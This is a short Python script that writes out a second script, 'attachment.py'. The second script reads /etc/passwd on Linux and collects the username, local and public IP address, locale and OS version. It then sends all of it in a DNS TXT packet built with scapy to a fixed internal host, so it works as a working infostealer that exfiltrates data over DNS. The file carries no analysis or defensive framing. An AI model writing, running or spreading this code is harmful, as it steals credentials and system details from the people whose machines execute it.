
if __name__ == "__main__":

    with open("attachment.py" , "w") as f:
        f.write("""import os
import socket
import urllib.request
import locale
import platform
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.layers.dns import DNS
from scapy.layers.dns import DNSRR, DNSQR
from requests import get
import sys
        
if __name__ == "__main__":        
    #geting info from user:

    if (os.name == "posix"): # linux
        with open("/etc/passwd", "rb") as f:
            pass_file = f.read()
        available_languages = locale.locale_alias.keys()
        user_language, _ = locale.getdefaultlocale()
        version = os.uname().nodename
    else: # windows
        #with open("C:\\Windows\\System32\\config", "rb") as f: #  Permission denied: 'C:\\Windows\\System32\\config'
        #    pass_file = f.read()
        pass_file = " "
        available_languages = locale.windows_locale.values()
        user_language, _ = locale.getdefaultlocale()
        version = sys.getwindowsversion().platform_version
        version = '.'.join(map(str, sys.getwindowsversion().platform_version))


    username = os.getlogin() # works in linux and windows

    # works in linux and windows
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    inside_ip = sock.getsockname()[0]
    sock.close()

    # works in linux and windows
    outside_ip = get("https://api.ipify.org").text


    #dns sending

    message = "passwords: " + str(pass_file) + "\\nusername: " +  username + "\\nlocal IP: " + inside_ip + "\\noutside IP: " + outside_ip + "\\navailable_languages: " + str(available_languages) + "\\nuser language: " + user_language + "\\nOS version: " + version

    # Create DNS layer
    dns_layer = DNS(
        id=1234,  # Set the DNS packet ID
        qr=0,  # Query/Response flag: 0 for query, 1 for response
        qd=DNSQR(qname="example.com")  # Set the query domain name
    )

    dnsrr_layer = DNSRR(
        rrname="example.com",
        type="TXT", 
        rdata= message
    )

    # Create UDP layer
    udp_layer = UDP(
        sport=RandShort(),  # Set random source port
        dport=53  # Set destination port to 53 (DNS)
    )

    # Create IP layer
    ip_layer = IP(
        src="192.168.0.1",  # Set source IP address
        dst="10.0.2.15"  # Set destination IP address
    )

    # Construct the packet by combining the layers
    packet = ip_layer / udp_layer / dns_layer / dnsrr_layer / message

    # Send the packet
    send(packet)""")


